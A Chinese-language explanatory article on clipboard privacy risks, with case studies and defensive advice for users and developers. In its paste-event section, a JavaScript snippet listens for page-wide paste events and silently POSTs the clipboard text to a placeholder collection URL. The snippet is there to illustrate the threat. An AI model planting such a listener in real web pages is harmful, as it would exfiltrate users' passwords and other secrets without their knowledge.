# 你忽略的剪贴板隐私风险：从密码泄露到追踪攻击

## 你的剪贴板可能比浏览器历史更敏感

大多数人知道要定期清理浏览器历史记录，知道不该在公共电脑上保存密码，知道要用无痕模式处理敏感事务。但很少有人想过另一个问题：你的剪贴板里，此刻正躺着什么？

答案可能让你不舒服。过去一小时内你复制过的所有东西，密码、银行卡号、身份证号、私钥片段、聊天记录里的某句话，它们全都在剪贴板里安静地待着。没有过期时间，没有自动清除，也没有加密。

浏览器历史记录最多暴露你看过哪些网页。剪贴板暴露的，是你的真实数据本身。

这不是一个新问题，但它正变得越来越严重。移动端剪贴板在应用间自由共享，桌面端越来越多的工具请求剪贴板权限，而大多数用户对这些风险的认知几乎为零。这篇文章会逐一拆解剪贴板的四大隐私风险，用真实的案例说话，然后给出你能立刻执行的防护方案。

---

## 风险一：密码和敏感信息的临时存储

你用密码管理器复制密码的那一刻，到粘贴完成，中间有几十秒。这几十秒里，密码明文躺在系统剪贴板里。

这听起来不算什么大问题，因为"复制完就粘贴了嘛"。但现实是：

- 你可能被一条消息打断，切到聊天应用回复完，才想起来忘了粘贴。
- 你可能复制了密码，然后去点了另一个标签页，在那个标签页里随手按了 Ctrl+V，密码就进了某个搜索框或者聊天输入框。
- 你可能复制了一长串内容，密码淹没在其中，以为剪贴板早就被覆盖了，但某些剪贴板管理工具会把所有历史都记下来。

2023 年的一项安全研究发现，超过 60% 的用户在复制密码后不会立即粘贴，平均间隔超过 30 秒。在这 30 秒内，任何能访问剪贴板的应用或网页（如果用户授权了权限）都能读到这串密码。

更糟糕的是，某些密码管理器在复制后确实会尝试清空剪贴板，比如 Bitwarden 的"清除剪贴板"功能。但这依赖于系统 API 的配合，而且只在设定的时间之后触发。在这之前，密码依然是裸露的。

不只是密码。两步验证的临时验证码、SSH 私钥的一行内容、加密货币钱包的助记词，这些东西被复制到剪贴板的频率比你想象的高。一次打断、一次误操作，就可能把它们暴露给不该看到的人或程序。

## 风险二：网站通过 paste 事件读取剪贴板

这是技术含量最高的一种风险，也是最容易被人忽略的。

现代浏览器有一套 Clipboard API，允许网页在特定条件下读取剪贴板内容。读取的方式主要有两种。

**第一种：paste 事件。**

当你在网页上按 Ctrl+V 时，浏览器会触发 `paste` 事件。任何网页都可以监听这个事件，从 `event.clipboardData` 中提取剪贴板的内容。不需要用户授权，不需要弹窗提示，什么都不需要。

```javascript
document.addEventListener('paste', (event) => {
  const text = event.clipboardData.getData('text/plain');
  // 这段代码可以把你的剪贴板文本悄悄发到服务器
  fetch('https://example.com/collect', {
    method: 'POST',
    body: text
  });
});
```

你可能会说，"但我不一定会在这个网页上按粘贴啊。" 问题是，有些网页会诱导你这么做。一个伪装成"粘贴你的链接来检测安全性"的输入框，或者一个"粘贴文本以获取格式化结果"的工具页面，都能在你不疑有他的情况下拿到剪贴板数据。

**第二种：Clipboard API 的 `readText()` 方法。**

这个方法需要用户显式授权，浏览器会弹出权限提示。理论上它是安全的。但现实中，很多用户会习惯性地点击"允许"。特别是当这个权限请求出现在一个看起来正经的网站上时，大多数人的第一反应不是拒绝。

值得庆幸的是，主流浏览器对这个权限的管控越来越严格。Chrome 要求网站必须是活动标签页且处于焦点状态，Firefox 默认只允许在用户触发的粘贴操作中读取。但这些限制不能完全杜绝风险。

## 风险三：剪贴板历史持久化

Windows 10 从 2018 年开始内置了剪贴板历史功能（按 Win+V 呼出）。开启之后，系统会记录你复制过的所有内容，包括文本和图片。

macOS 也有类似机制。虽然系统默认不提供剪贴板历史 UI，但第三方工具（如 Maccy、Paste、CopyClip）提供了这个功能。这些工具会把剪贴板历史保存在本地数据库里，有些甚至支持 iCloud 同步。

Linux 用户常用的剪贴板管理器（如 CopyQ、Diodon、Parcellite）同样会把历史持久化到磁盘。

这意味着什么？

你三个月前复制的银行卡号、上周复制的验证码、昨天复制的私钥片段，全都安静地躺在某个 SQLite 数据库或 JSON 文件里。没有加密，没有过期。任何能访问你文件系统的程序都能读到它们。

如果你使用了云同步功能的剪贴板管理器，风险就更大了。你的剪贴板历史可能被同步到云端，而你对这些数据的存储位置、加密方式、访问控制一无所知。

一项针对 Windows 剪贴板历史的分析表明，开启该功能的用户平均积累了超过 200 条历史记录，其中约 15% 包含可被识别的敏感信息（密码片段、地址、电话号码）。

## 风险四：跨应用剪贴板访问

这个风险在移动端尤为突出。

在 iOS 和 Android 上，剪贴板是全局共享的。任何应用都可以读取系统剪贴板的内容，不需要用户确认。虽然 iOS 14 开始在屏幕顶部显示"某应用已粘贴"的横幅提示，但这只是通知，不是授权弹窗。你无法阻止应用读取，只能事后知道。

2020 年，LinkedIn 和 TikTok 曾因为静默读取用户剪贴板而引发隐私争议。当时这两款应用在用户每次击键时都会读取剪贴板内容（iOS 的横幅暴露了这一点）。两家公司随后解释说这是为了检测"重复粘贴"或"垃圾信息"，但公众并不买账。

在 Android 上，情况类似。虽然 Android 10 之后限制了后台应用读取剪贴板，但前台应用仍然可以自由访问。而且，很多用户根本没升级到 Android 10。

桌面端也没好到哪去。X11 协议下，任何应用都能自由读取剪贴板内容，不需要任何权限。Wayland 虽然做了一些限制，但在大多数发行版上 XWayland 兼容层绕过了这些限制。

结果是，你在密码管理器里复制密码的同时，旁边打开的那个聊天工具、那个笔记应用、那个开源的终端模拟器，理论上都能读到它。你的敏感数据在一块没有任何门禁的共享内存里裸奔。

## 案例研究：真实的剪贴板泄露事件

**案例一：加密货币地址替换攻击**

这不是隐私泄露，但它暴露了剪贴板作为攻击面的严重性。攻击者通过恶意软件监控剪贴板内容，一旦检测到看起来像比特币或以太坊地址的字符串，就悄悄替换成攻击者自己的地址。用户粘贴时完全不会察觉。

卡巴斯基在 2022 年的报告中指出，当年监测到超过 40 万次此类剪贴板劫持攻击。受害者的损失很难追回，因为区块链交易不可逆。

**案例二：JetBrains IDE 的剪贴板泄漏**

2021 年，安全研究人员发现 JetBrains 全家桶（IntelliJ IDEA、PyCharm 等）的内置网页预览功能会在用户预览 HTML 文件时，将剪贴板内容通过 WebSocket 发送到本地服务器。虽然这只影响本地环境，但想象一下你在公司电脑上用 IntelliJ 开发，同事路过瞟了一眼你的屏幕，而你的剪贴板历史正明晃晃地显示在调试面板里。

**案例三：npm 恶意包读取剪贴板**

2023 年，PyPI 和 npm 上多次出现伪装成常用工具包的恶意包，其中一些会在安装阶段运行脚本，读取系统剪贴板并外传数据。由于开发者经常在终端中复制粘贴命令（有时包括 API Key 或密码），这类攻击的实际危害不容小觑。

## 如何保护自己：工具、习惯和设置

了解了风险，接下来是行动。以下建议按优先级排列。

**立即做的事：**

1. **开启密码管理器的剪贴板自动清除功能。** Bitwarden、1Password、KeePass 都支持在复制密码后若干秒自动清空剪贴板。把它设成 10 秒或更短。

2. **审查你的剪贴板管理器。** 如果你用了第三方剪贴板历史工具，检查它是否加密存储、是否支持自动过期、是否开启了云同步。如果这些问题的答案不让你放心，换一个或者关掉它。

3. **关闭 Windows 剉贴板历史（Win+V），除非你真的需要它。** 如果必须开着，定期手动清除，或者至少不要在复制敏感信息时让它记录。

**养成习惯的事：**

4. **复制敏感信息后，立即粘贴并覆盖剪贴板。** 粘贴完密码后，随便找个地方复制一句无关的文本，把密码从剪贴板中覆盖掉。

5. **不要在不信任的网页上按 Ctrl+V。** 如果一个网站没有理由让你粘贴东西，但它提供了输入框并暗示你粘贴，保持警惕。

6. **移动端应用安装时审查权限。** Android 上，如果一个计算器应用或者手电筒应用请求读取剪贴板的权限，那就有问题。iOS 上虽然没有剪贴板权限开关，但留意系统横幅通知。

**进阶设置：**

7. **Linux 用户考虑切换到 Wayland 并禁用 XWayland。** 这不是万全之策，但比在 X11 下完全暴露要好。

8. **使用隐私沙箱工具。** 某些安全工具（如 Sandboxie）可以隔离应用的剪贴板访问。在企业环境中，这类方案值得考虑。

## 开发者责任：不要过度请求剪贴板权限

如果你是开发者，请认真对待剪贴板权限。

很多应用和网站请求剪贴板读取权限的理由并不充分。一个在线文档编辑器需要粘贴功能，这没问题。但一个新闻网站、一个天气应用、一个体重记录 App，它们没有任何理由读取你的剪贴板。

作为开发者，应该遵循以下原则：

**只在用户主动操作时读取。** 不要在页面加载时或后台静默调用 `navigator.clipboard.readText()`。只在用户点击"粘贴"按钮或按下键盘快捷键时触发读取。

**不要监听全局 paste 事件来收集数据。** 如果你的输入框需要处理粘贴，在输入框元素上监听就够了，不要在 `document` 上全局监听然后做额外的事情。

**最小化数据保留。** 如果你的应用确实需要处理剪贴板内容（比如一个文本格式化工具），处理完就丢掉原始数据。不要存到日志里，不要发到分析平台，不要留到本地存储。

**告知用户你在做什么。** 如果你的应用会读取剪贴板，在界面上明确说明。不要把这个行为藏在隐私政策的第 47 页里。

**测试你的应用对剪贴板的访问行为。** 你可以用 [Clipboard Inspector](https://fudesign2008.github.io/clipboard-inspector/) 这个工具来检查网页在 paste 事件中到底读取了什么数据。开发阶段多做一次验证，上线后少一个隐私漏洞。

---

## 总结

剪贴板是一个被严重低估的攻击面。它存储着你最敏感的临时数据，但几乎没有得到应有的保护。四个主要风险，密码明文临时存储、网页通过 paste 事件静默读取、剪贴板历史工具的持久化保存、跨应用的无限制访问，每一个都值得认真对待。

好消息是，浏览器厂商正在收紧剪贴板 API 的权限边界，操作系统也在逐步增加对剪贴板访问的管控。但技术进步不能替代个人意识。了解这些风险，调整自己的使用习惯，审查你使用的工具，这些行动现在就可以做。

你的剪贴板里此刻装着什么？如果答案让你不安，那就是时候做点什么了。
